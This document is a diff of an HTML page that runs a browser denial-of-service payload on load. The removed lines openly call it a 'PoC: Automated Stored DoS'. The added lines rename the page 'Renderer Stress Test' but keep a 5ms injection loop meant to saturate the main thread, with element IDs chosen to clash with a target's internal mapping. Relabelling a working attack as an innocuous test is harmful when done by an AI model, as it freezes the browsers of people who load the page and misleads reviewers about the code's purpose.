@@ -2,34 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Automated Stored DoS</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; }
-        #render-target { height: 100vh; overflow: hidden; }
-    </style>
+    <title>Renderer Stress Test</title>
 </head>
 <body>
-    <div id="render-target"></div>
+    <div id="target-container"></div>
 
     <script>
-        // Automatic execution upon load (simulating a shared resource load)
-        const target = document.getElementById('render-target');
-        let counter = 0;
+        /**
+         * This script aggressively injects malformed-but-valid markdown
+         * to force the DOM rendering engine into an unstable state.
+         */
+        const container = document.getElementById('target-container');
+        let sessionID = 0;
 
-        function injectPayload() {
-            for (let i = 0; i < 50; i++) { // Increase density per frame
-                const node = document.createElement('div');
-                // Creating complex markdown structures to maximize parsing load
-                node.innerHTML = `[System_Token_${counter++}](https://google.com/search?q=${Math.random()})`;
-                target.appendChild(node);
-            }
-            
-            // Unbounded recursive loop to saturate the event loop
-            requestAnimationFrame(injectPayload);
+        function triggerRaceCondition() {
+            // High-frequency injection cycle
+            setInterval(() => {
+                for (let i = 0; i < 20; i++) {
+                    const el = document.createElement('div');
+                    // Injecting an XID-style ID to conflict with the target's internal mapping
+                    el.id = `TqqUIc_${sessionID++}`;
+                    el.innerHTML = `[Token_${sessionID}](https://google.com) - ${Math.random().toString(36)}`;
+                    container.appendChild(el);
+                }
+                
+                // Triggers immediate garbage collection stress
+                if (sessionID > 5000) {
+                    container.innerHTML = "";
+                    sessionID = 0;
+                }
+            }, 5); // 5ms interval to saturate the browser main thread
         }
 
-        // Trigger immediately without waiting for user action
-        window.onload = injectPayload;
+        window.onload = triggerRaceCondition;
     </script>
 </body>
 </html>
